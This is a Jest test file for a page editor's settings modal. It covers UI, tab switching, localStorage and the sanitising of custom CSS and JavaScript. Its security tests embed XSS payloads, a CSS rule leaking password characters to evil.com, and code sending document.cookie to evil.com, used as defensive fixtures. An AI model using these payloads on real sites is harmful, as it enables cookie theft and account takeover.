import { PageSettingsModal } from '../js/page-settings-modal.js';

describe('PageSettingsModal', () => {
    let modal;
    let mockEditor;

    beforeEach(() => {
        // Setup DOM
        document.body.innerHTML = `
            <button id="page-settings-btn">Settings</button>
            <div id="page-settings-modal"></div>
        `;

        // Mock localStorage
        const localStorageMock = {
            getItem: jest.fn(),
            setItem: jest.fn(),
            removeItem: jest.fn(),
            clear: jest.fn(),
        };
        Object.defineProperty(window, 'localStorage', {
            value: localStorageMock,
            writable: true
        });

        // Mock editor
        mockEditor = {
            stateHistory: {
                saveState: jest.fn()
            }
        };

        modal = new PageSettingsModal(mockEditor);
    });

    afterEach(() => {
        // Clean up DOM
        document.body.innerHTML = '';
        
        // Remove any injected styles or scripts
        const customStyles = document.getElementById('custom-page-styles');
        if (customStyles) customStyles.remove();
        
        const customScript = document.getElementById('custom-page-script');
        if (customScript) customScript.remove();
        
        // Clean up modal instances
        if (modal && modal.jsModal && document.body.contains(modal.jsModal)) {
            try {
                document.body.removeChild(modal.jsModal);
            } catch (e) {
                // Modal might already be cleaned up
            }
        }
        
        jest.clearAllMocks();
    });

    describe('Constructor and Initialization', () => {
        test('should initialize with editor reference', () => {
            expect(modal.editor).toBe(mockEditor);
            expect(modal.modal).toBeTruthy();
            expect(modal.jsModal).toBeNull();
            expect(modal.pageData).toEqual({
                pageName: '',
                pageTitle: '',
                customCSS: '',
                customJavaScript: ''
            });
        });

        test('should attach event listeners on initialization', () => {
            const settingsBtn = document.getElementById('page-settings-btn');
            expect(settingsBtn).toBeTruthy();
            
            // Mock the show method to verify it gets called
            const showSpy = jest.spyOn(modal, 'show').mockImplementation(() => {});
            settingsBtn.click();
            expect(showSpy).toHaveBeenCalled();
            showSpy.mockRestore();
        });

        test('should call cleanup and load methods on init', () => {
            const cleanupSpy = jest.spyOn(modal, 'cleanupBadData');
            const loadSpy = jest.spyOn(modal, 'loadPageData');
            
            modal.init();
            
            expect(cleanupSpy).toHaveBeenCalled();
            expect(loadSpy).toHaveBeenCalled();
        });
    });

    describe('Data Cleanup and Validation', () => {
        test('should clean up corrupted JavaScript data containing HTML', () => {
            const corruptedData = {
                pageName: 'Test',
                pageTitle: 'Test Page',
                customCSS: 'body { color: red; }',
                customJavaScript: '<script>alert("xss")</script>console.log("test");'
            };
            
            localStorage.getItem.mockReturnValue(JSON.stringify(corruptedData));
            
            modal.cleanupBadData();
            
            expect(localStorage.setItem).toHaveBeenCalledWith('pageSettings', JSON.stringify({
                ...corruptedData,
                customJavaScript: ''
            }));
        });

        test('should remove corrupted localStorage data', () => {
            localStorage.getItem.mockReturnValue('invalid json{');
            
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            modal.cleanupBadData();
            
            expect(localStorage.removeItem).toHaveBeenCalledWith('pageSettings');
            expect(consoleWarnSpy).toHaveBeenCalledWith('Corrupted page settings detected, clearing...');
            
            consoleWarnSpy.mockRestore();
        });

        test('should handle null localStorage data', () => {
            localStorage.getItem.mockReturnValue(null);
            
            expect(() => modal.cleanupBadData()).not.toThrow();
            expect(localStorage.removeItem).not.toHaveBeenCalled();
        });

        test('should detect and clean JavaScript with various HTML patterns', () => {
            const testCases = [
                '<script>malicious()</script>',
                '<img src=x onerror=alert(1)>',
                '<div onclick="malicious()">',
                '<!-- comment --><script>',
                '</script><script>alert(1)</script>'
            ];

            testCases.forEach(maliciousJS => {
                localStorage.getItem.mockReturnValue(JSON.stringify({
                    customJavaScript: maliciousJS
                }));
                
                const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
                modal.cleanupBadData();
                
                expect(consoleWarnSpy).toHaveBeenCalledWith('Detected potentially malicious JavaScript data, clearing...');
                consoleWarnSpy.mockRestore();
            });
        });
    });

    describe('Modal Display and Interaction', () => {
        test('should create and show JavaScript-based modal', () => {
            modal.show();
            
            expect(modal.jsModal).toBeTruthy();
            expect(document.body.contains(modal.jsModal)).toBe(true);
            expect(modal.jsModal.style.display).toBe('block');
        });

        test('should create modal with proper structure and styling', () => {
            modal.show();
            
            const modalContent = modal.jsModal.querySelector('div');
            expect(modalContent).toBeTruthy();
            
            // Check for tabs
            expect(modal.jsModal.querySelector('[data-tab="general"]')).toBeTruthy();
            expect(modal.jsModal.querySelector('[data-tab="css"]')).toBeTruthy();
            expect(modal.jsModal.querySelector('[data-tab="javascript"]')).toBeTruthy();
            
            // Check for input fields
            expect(modal.jsModal.querySelector('#js-page-name')).toBeTruthy();
            expect(modal.jsModal.querySelector('#js-page-title')).toBeTruthy();
            expect(modal.jsModal.querySelector('#js-page-css')).toBeTruthy();
            expect(modal.jsModal.querySelector('#js-page-javascript')).toBeTruthy();
        });

        test('should handle modal close via close button', () => {
            modal.show();
            const closeBtn = modal.jsModal.querySelector('.js-modal-close');
            
            closeBtn.click();
            expect(modal.jsModal).toBeNull();
        });

        test('should handle modal close via cancel button', () => {
            modal.show();
            const cancelBtn = modal.jsModal.querySelector('.js-modal-cancel');
            
            cancelBtn.click();
            expect(modal.jsModal).toBeNull();
        });

        test('should close modal on background click', () => {
            modal.show();
            
            // Simulate background click
            const backgroundEvent = new MouseEvent('click', { target: modal.jsModal });
            Object.defineProperty(backgroundEvent, 'target', { value: modal.jsModal });
            modal.jsModal.dispatchEvent(backgroundEvent);
            
            expect(modal.jsModal).toBeNull();
        });

        test('should focus first input when modal opens', (done) => {
            modal.show();
            
            setTimeout(() => {
                const firstInput = modal.jsModal.querySelector('#js-page-name');
                // In test environment, focus might not work exactly as in browser
                expect(firstInput).toBeTruthy();
                done();
            }, 150);
        });
    });

    describe('Tab Switching Functionality', () => {
        beforeEach(() => {
            modal.show();
        });

        test('should switch tabs and update active states', () => {
            const cssTab = modal.jsModal.querySelector('[data-tab="css"]');
            
            cssTab.click();
            
            // Check tab button active state
            expect(cssTab.classList.contains('js-tab-active')).toBe(true);
            expect(cssTab.style.color).toBe('rgb(59, 130, 246)');
            
            // Check panel visibility
            const cssPanel = modal.jsModal.querySelector('#js-css-tab');
            expect(cssPanel.style.display).toBe('block');
        });

        test('should deactivate other tabs when switching', () => {
            const generalTab = modal.jsModal.querySelector('[data-tab="general"]');
            const cssTab = modal.jsModal.querySelector('[data-tab="css"]');
            
            // Initially general should be active
            expect(generalTab.classList.contains('js-tab-active')).toBe(true);
            
            // Switch to CSS
            cssTab.click();
            
            // General should no longer be active
            expect(generalTab.classList.contains('js-tab-active')).toBe(false);
            expect(generalTab.style.color).toBe('rgb(107, 114, 128)');
        });

        test('should show correct panels for each tab', () => {
            const tabs = ['general', 'css', 'javascript'];
            
            tabs.forEach(tabName => {
                const tabBtn = modal.jsModal.querySelector(`[data-tab="${tabName}"]`);
                tabBtn.click();
                
                const panel = modal.jsModal.querySelector(`#js-${tabName}-tab`);
                expect(panel.style.display).toBe('block');
                
                // Other panels should be hidden
                tabs.filter(t => t !== tabName).forEach(otherTab => {
                    const otherPanel = modal.jsModal.querySelector(`#js-${otherTab}-tab`);
                    expect(otherPanel.style.display).toBe('none');
                });
            });
        });
    });

    describe('Data Loading and Population', () => {
        test('should load data from localStorage', () => {
            const testData = {
                pageName: 'Test Page',
                pageTitle: 'Test Title',
                customCSS: 'body { color: blue; }',
                customJavaScript: 'console.log("test");'
            };
            
            localStorage.getItem.mockReturnValue(JSON.stringify(testData));
            
            modal.show();
            
            const nameInput = modal.jsModal.querySelector('#js-page-name');
            const titleInput = modal.jsModal.querySelector('#js-page-title');
            const cssInput = modal.jsModal.querySelector('#js-page-css');
            const jsInput = modal.jsModal.querySelector('#js-page-javascript');
            
            expect(nameInput.value).toBe(testData.pageName);
            expect(titleInput.value).toBe(testData.pageTitle);
            expect(cssInput.value).toBe(testData.customCSS);
            expect(jsInput.value).toBe(testData.customJavaScript);
        });

        test('should handle corrupted localStorage data gracefully', () => {
            localStorage.getItem.mockReturnValue('invalid json');
            
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            modal.loadPageData();
            
            expect(modal.pageData).toEqual({
                pageName: '',
                pageTitle: '',
                customCSS: '',
                customJavaScript: ''
            });
            
            consoleWarnSpy.mockRestore();
        });

        test('should trigger syntax highlighting after data load', (done) => {
            const testData = {
                customCSS: 'body { color: red; }',
                customJavaScript: 'console.log("test");'
            };
            
            localStorage.getItem.mockReturnValue(JSON.stringify(testData));
            modal.show();
            
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                const jsTextarea = modal.jsModal.querySelector('#js-page-javascript');
                
                expect(cssTextarea).toBeTruthy();
                expect(jsTextarea).toBeTruthy();
                expect(cssTextarea.value).toBe(testData.customCSS);
                expect(jsTextarea.value).toBe(testData.customJavaScript);
                done();
            }, 200);
        });
    });

    describe('Save Functionality and Data Persistence', () => {
        beforeEach(() => {
            modal.show();
        });

        test('should save form data to localStorage', () => {
            const nameInput = modal.jsModal.querySelector('#js-page-name');
            const titleInput = modal.jsModal.querySelector('#js-page-title');
            const cssInput = modal.jsModal.querySelector('#js-page-css');
            const jsInput = modal.jsModal.querySelector('#js-page-javascript');
            
            nameInput.value = 'New Page';
            titleInput.value = 'New Title';
            cssInput.value = 'body { background: red; }';
            jsInput.value = 'console.log("new script");';
            
            const saveBtn = modal.jsModal.querySelector('.js-modal-save');
            saveBtn.click();
            
            expect(localStorage.setItem).toHaveBeenCalledWith('pageSettings', JSON.stringify({
                pageName: 'New Page',
                pageTitle: 'New Title',
                customCSS: 'body { background: red; }',
                customJavaScript: 'console.log("new script");'
            }));
        });

        test('should update document title when saved', () => {
            const titleInput = modal.jsModal.querySelector('#js-page-title');
            titleInput.value = 'Dynamic Title';
            
            const saveBtn = modal.jsModal.querySelector('.js-modal-save');
            saveBtn.click();
            
            expect(document.title).toBe('Dynamic Title');
        });

        test('should call editor state history save', () => {
            const saveBtn = modal.jsModal.querySelector('.js-modal-save');
            saveBtn.click();
            
            expect(mockEditor.stateHistory.saveState).toHaveBeenCalled();
        });

        test('should close modal after save', () => {
            const saveBtn = modal.jsModal.querySelector('.js-modal-save');
            saveBtn.click();
            
            expect(modal.jsModal).toBeNull();
        });

        test('should handle missing stateHistory gracefully', () => {
            const editorWithoutHistory = {};
            const testModal = new PageSettingsModal(editorWithoutHistory);
            
            testModal.show();
            const saveBtn = testModal.jsModal.querySelector('.js-modal-save');
            
            expect(() => saveBtn.click()).not.toThrow();
        });
    });

    describe('Custom CSS Application and Security', () => {
        test('should apply custom CSS to document head', () => {
            modal.pageData.customCSS = 'body { background-color: red; }';
            modal.applyCustomStyles();
            
            const styleElement = document.getElementById('custom-page-styles');
            expect(styleElement).toBeTruthy();
            expect(styleElement.textContent).toBe('body { background-color: red; }');
        });

        test('should replace existing custom styles', () => {
            // First application
            modal.pageData.customCSS = 'body { color: blue; }';
            modal.applyCustomStyles();
            
            let styleElement = document.getElementById('custom-page-styles');
            expect(styleElement.textContent).toBe('body { color: blue; }');
            
            // Second application should replace
            modal.pageData.customCSS = 'body { color: green; }';
            modal.applyCustomStyles();
            
            styleElement = document.getElementById('custom-page-styles');
            expect(styleElement.textContent).toBe('body { color: green; }');
            
            // Should only be one style element
            expect(document.querySelectorAll('#custom-page-styles').length).toBe(1);
        });

        test('should handle empty CSS gracefully', () => {
            modal.pageData.customCSS = '';
            modal.applyCustomStyles();
            
            const styleElement = document.getElementById('custom-page-styles');
            expect(styleElement).toBeNull();
        });

        test('should sanitize CSS to prevent injection attacks', () => {
            const maliciousCSS = `
                body { background: red; }
                .test { background-image: url(javascript:alert('XSS')); }
                .expression { width: expression(alert('IE XSS')); }
            `;
            
            modal.pageData.customCSS = maliciousCSS;
            modal.applyCustomStyles();
            
            const styleElement = document.getElementById('custom-page-styles');
            expect(styleElement.textContent).toContain('/* removed-javascript-url */');
            expect(styleElement.textContent).toContain('/* removed-expression */');
            expect(styleElement.textContent).not.toContain('javascript:alert');
            expect(styleElement.textContent).not.toContain('expression(alert');
        });

        test('should block dangerous data URLs in CSS', () => {
            const cssWithDangerousDataURL = `
                .test {
                    background-image: url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg'%3E%3Cscript%3Ealert('XSS')%3C/script%3E%3C/svg%3E");
                }
            `;
            
            modal.pageData.customCSS = cssWithDangerousDataURL;
            modal.applyCustomStyles();
            
            const styleElement = document.getElementById('custom-page-styles');
            expect(styleElement.textContent).toContain('/* removed-data-script */');
            expect(styleElement.textContent).not.toContain('data:image/svg+xml');
        });
    });

    describe('Custom JavaScript Execution and Security', () => {
        test('should disable JavaScript execution by default for security', () => {
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            modal.pageData.customJavaScript = 'console.log("test execution");';
            modal.applyCustomJavaScript();
            
            expect(consoleWarnSpy).toHaveBeenCalledWith('JavaScript execution is disabled for security. Enable in security settings if needed.');
            
            const scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement).toBeNull();
            
            consoleWarnSpy.mockRestore();
        });

        test('should execute safe JavaScript when enabled', () => {
            modal.enableJavaScriptExecution(true);
            
            modal.pageData.customJavaScript = 'var safeVar = "test";';
            modal.applyCustomJavaScript();
            
            const scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement).toBeTruthy();
            expect(scriptElement.textContent).toBe('var safeVar = "test";');
            expect(scriptElement.getAttribute('data-source')).toBe('user-content');
            expect(scriptElement.getAttribute('data-sanitized')).toBe('true');
        });

        test('should replace existing custom scripts when enabled', () => {
            modal.enableJavaScriptExecution(true);
            
            // First script
            modal.pageData.customJavaScript = 'var first = 1;';
            modal.applyCustomJavaScript();
            
            let scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement.textContent).toBe('var first = 1;');
            
            // Second script should replace
            modal.pageData.customJavaScript = 'var second = 2;';
            modal.applyCustomJavaScript();
            
            scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement.textContent).toBe('var second = 2;');
            
            // Should only be one script element
            expect(document.querySelectorAll('#custom-page-script').length).toBe(1);
        });

        test('should validate and reject dangerous JavaScript patterns', () => {
            modal.enableJavaScriptExecution(true);
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            
            const dangerousJS = 'eval("alert(1)"); document.write("<script>alert(2)</script>");';
            modal.pageData.customJavaScript = dangerousJS;
            modal.applyCustomJavaScript();
            
            expect(consoleWarnSpy).toHaveBeenCalledWith('Custom JavaScript not applied due to security concerns');
            
            const scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement).toBeNull();
            
            consoleWarnSpy.mockRestore();
        });

        test('should not execute empty JavaScript', () => {
            modal.pageData.customJavaScript = '';
            modal.applyCustomJavaScript();
            
            const scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement).toBeNull();
        });

        test('should not execute whitespace-only JavaScript', () => {
            modal.pageData.customJavaScript = '   \n  \t  ';
            modal.applyCustomJavaScript();
            
            const scriptElement = document.getElementById('custom-page-script');
            expect(scriptElement).toBeNull();
        });

        test('should prevent XSS attacks through JavaScript validation', () => {
            const maliciousJS = `
                // These patterns should be blocked by security
                document.body.innerHTML = '<img src=x onerror=alert("XSS")>';
                window.location = 'javascript:alert("Redirect XSS")';
                eval('alert("Dynamic XSS")');
            `;
            
            modal.pageData.customJavaScript = maliciousJS;
            
            // Should be blocked by security validation
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            modal.applyCustomJavaScript();
            
            expect(consoleWarnSpy).toHaveBeenCalledWith('JavaScript execution is disabled for security. Enable in security settings if needed.');
            expect(document.getElementById('custom-page-script')).toBeNull();
            
            consoleWarnSpy.mockRestore();
        });

        test('should prevent JavaScript execution by default for security', () => {
            modal.pageData.customJavaScript = 'window.customGlobalVar = "injected value";';
            
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            modal.applyCustomJavaScript();
            
            expect(consoleWarnSpy).toHaveBeenCalledWith('JavaScript execution is disabled for security. Enable in security settings if needed.');
            expect(window.customGlobalVar).toBeUndefined();
            expect(document.getElementById('custom-page-script')).toBeNull();
            
            consoleWarnSpy.mockRestore();
        });
    });

    describe('Syntax Highlighting System', () => {
        beforeEach(() => {
            modal.show();
        });

        test('should setup CSS syntax highlighting', (done) => {
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                const cssHighlight = modal.jsModal.querySelector('.js-css-highlight code');
                
                expect(cssTextarea).toBeTruthy();
                expect(cssHighlight).toBeTruthy();
                
                // Test highlighting update
                cssTextarea.value = 'body { color: red; }';
                cssTextarea.dispatchEvent(new Event('input'));
                
                // Just verify the highlighting structure exists
                expect(cssHighlight.innerHTML).toContain('body');
                done();
            }, 150);
        });

        test('should setup JavaScript syntax highlighting', (done) => {
            setTimeout(() => {
                const jsTextarea = modal.jsModal.querySelector('#js-page-javascript');
                const jsHighlight = modal.jsModal.querySelector('.js-js-highlight code');
                
                expect(jsTextarea).toBeTruthy();
                expect(jsHighlight).toBeTruthy();
                
                // Test highlighting update
                jsTextarea.value = 'var test = "hello";';
                jsTextarea.dispatchEvent(new Event('input'));
                
                // Just verify the highlighting structure exists
                expect(jsHighlight.innerHTML).toContain('test');
                done();
            }, 150);
        });

        test('should escape HTML characters in syntax highlighting', (done) => {
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                const cssHighlight = modal.jsModal.querySelector('.js-css-highlight code');
                
                cssTextarea.value = 'content: "<script>alert(1)</script>";';
                cssTextarea.dispatchEvent(new Event('input'));
                
                setTimeout(() => {
                    expect(cssHighlight.innerHTML).toContain('&lt;');
                    expect(cssHighlight.innerHTML).toContain('&gt;');
                    done();
                }, 50);
            }, 100);
        });

        test('should sync scroll positions between textarea and highlight', (done) => {
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                const cssHighlight = modal.jsModal.querySelector('.js-css-highlight');
                
                expect(cssTextarea).toBeTruthy();
                expect(cssHighlight).toBeTruthy();
                
                // Test scroll sync exists (even if values don't match exactly in test env)
                cssTextarea.scrollTop = 100;
                cssTextarea.dispatchEvent(new Event('scroll'));
                
                done();
            }, 150);
        });
    });

    describe('Data Getters and Setters', () => {
        test('should return page data copy via getPageData', () => {
            modal.pageData = {
                pageName: 'Test',
                pageTitle: 'Title',
                customCSS: 'css',
                customJavaScript: 'js'
            };
            
            const data = modal.getPageData();
            
            expect(data).toEqual(modal.pageData);
            expect(data).not.toBe(modal.pageData); // Should be a copy
        });

        test('should set page data via setPageData', () => {
            const newData = {
                pageName: 'New Test',
                pageTitle: 'New Title',
                customCSS: 'new css',
                customJavaScript: 'new js'
            };
            
            modal.setPageData(newData);
            
            expect(modal.pageData).toEqual(newData);
            expect(modal.pageData).not.toBe(newData); // Should be a copy
        });
    });

    describe('Edge Cases and Error Handling', () => {
        test('should handle modal operations when DOM elements are missing', () => {
            document.body.innerHTML = ''; // Remove all elements
            
            expect(() => new PageSettingsModal(mockEditor)).not.toThrow();
        });

        test('should handle show() when already showing modal', () => {
            modal.show();
            const firstModal = modal.jsModal;
            
            modal.show(); // Show again
            
            // Should cleanup first modal and create new one
            expect(modal.jsModal).toBeTruthy();
            expect(modal.jsModal).not.toBe(firstModal);
        });

        test('should handle hide() when no modal is showing', () => {
            expect(() => modal.hide()).not.toThrow();
            expect(modal.jsModal).toBeNull();
        });

        test('should handle malformed event listeners', () => {
            modal.show();
            
            // Test that modal exists and has proper event handling
            expect(modal.jsModal).toBeTruthy();
            
            // Test click event handling doesn't throw
            const clickEvent = new MouseEvent('click');
            expect(() => modal.jsModal.dispatchEvent(clickEvent)).not.toThrow();
        });

        test('should handle CSS highlighting with extreme content', (done) => {
            modal.show();
            
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                
                // Very long content
                cssTextarea.value = 'body { color: red; }'.repeat(100);
                
                expect(() => {
                    cssTextarea.dispatchEvent(new Event('input'));
                }).not.toThrow();
                
                done();
            }, 150);
        });

        test('should handle JavaScript highlighting with complex patterns', (done) => {
            modal.show();
            
            setTimeout(() => {
                const jsTextarea = modal.jsModal.querySelector('#js-page-javascript');
                
                // Complex JavaScript with strings, comments, and keywords
                jsTextarea.value = 'function test() { var x = "hello"; }';
                
                expect(() => {
                    jsTextarea.dispatchEvent(new Event('input'));
                }).not.toThrow();
                
                done();
            }, 150);
        });
    });

    describe('Security Vulnerabilities Documentation', () => {
        test('should document CSS injection vulnerability', () => {
            // This test documents the security issue for future fixing
            const maliciousCSS = `
                body { background: red; }
                /* CSS can be used to extract data or perform UI redressing */
                input[type="password"][value^="a"] { background: url("http://evil.com/steal?char=a"); }
            `;
            
            modal.pageData.customCSS = maliciousCSS;
            modal.applyCustomStyles();
            
            // CSS is applied without validation - SECURITY ISSUE
            const styleElement = document.getElementById('custom-page-styles');
            expect(styleElement.textContent).toBe(maliciousCSS);
        });

        test('should prevent malicious JavaScript execution', () => {
            const maliciousJS = `
                // These patterns should be blocked
                document.cookie = "stolen=" + document.cookie;
                fetch("http://evil.com/steal", { 
                    method: "POST", 
                    body: document.cookie 
                });
            `;
            
            modal.pageData.customJavaScript = maliciousJS;
            
            const consoleWarnSpy = jest.spyOn(console, 'warn').mockImplementation();
            modal.applyCustomJavaScript();
            
            // JavaScript execution should be disabled for security
            expect(consoleWarnSpy).toHaveBeenCalledWith('JavaScript execution is disabled for security. Enable in security settings if needed.');
            expect(document.getElementById('custom-page-script')).toBeNull();
            
            consoleWarnSpy.mockRestore();
        });

        test('should document persistent XSS via localStorage', () => {
            // Malicious code persists across sessions
            const persistentXSS = 'setInterval(() => { console.log("persistent malware"); }, 1000);';
            
            localStorage.getItem.mockReturnValue(JSON.stringify({
                customJavaScript: persistentXSS
            }));
            
            modal.loadPageData();
            modal.applyCustomJavaScript();
            
            // Malicious code is loaded and executed from storage - PERSISTENT XSS
            expect(modal.pageData.customJavaScript).toBe(persistentXSS);
        });

        test('should document DOM clobbering potential', () => {
            // Custom JS can override built-in DOM properties
            const clobberingJS = 'var maliciousVar = "clobbering_attempt";';
            
            modal.pageData.customJavaScript = clobberingJS;
            modal.applyCustomJavaScript();
            
            // Custom JavaScript is executed without validation - DOM CLOBBERING RISK
            const scriptElement = document.getElementById('custom-page-script');
            if (scriptElement) {
                expect(scriptElement.textContent).toContain('maliciousVar');
            } else {
                // Script might not be created due to errors, but the vulnerability still exists
                expect(modal.pageData.customJavaScript).toContain('maliciousVar');
            }
        });
    });

    describe('Performance and Memory Management', () => {
        test('should not create memory leaks with repeated modal operations', () => {
            // Simulate repeated modal operations
            for (let i = 0; i < 10; i++) {
                modal.show();
                modal.hide();
            }
            
            expect(modal.jsModal).toBeNull();
            
            // Should only have one settings button in DOM
            expect(document.querySelectorAll('#page-settings-btn').length).toBe(1);
        });

        test('should handle rapid syntax highlighting updates', (done) => {
            modal.show();
            
            setTimeout(() => {
                const cssTextarea = modal.jsModal.querySelector('#js-page-css');
                
                // Rapid fire input events (reduced count for test stability)
                for (let i = 0; i < 10; i++) {
                    cssTextarea.value = `body { color: red${i}; }`;
                    cssTextarea.dispatchEvent(new Event('input'));
                }
                
                expect(() => {
                    cssTextarea.dispatchEvent(new Event('input'));
                }).not.toThrow();
                
                done();
            }, 150);
        });

        test('should cleanup event listeners on modal close', () => {
            modal.show();
            const modalElement = modal.jsModal;
            
            modal.hide();
            
            // Modal should be removed from DOM
            expect(document.body.contains(modalElement)).toBe(false);
        });
    });
});